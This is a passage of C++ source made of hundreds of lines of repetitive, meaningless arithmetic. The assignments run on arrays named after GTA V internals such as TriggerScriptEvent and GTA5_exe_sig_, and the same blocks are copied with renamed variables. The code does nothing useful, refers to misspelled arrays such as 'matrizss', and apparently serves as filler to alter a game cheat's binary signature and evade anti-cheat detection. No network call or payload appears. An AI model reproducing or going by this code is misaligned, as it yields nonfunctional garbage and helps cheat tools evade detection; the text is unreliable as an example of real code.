			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Spawn.RotY = Extern_Reader::INIFile::Float::LerFloat(buffer, "RotY");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
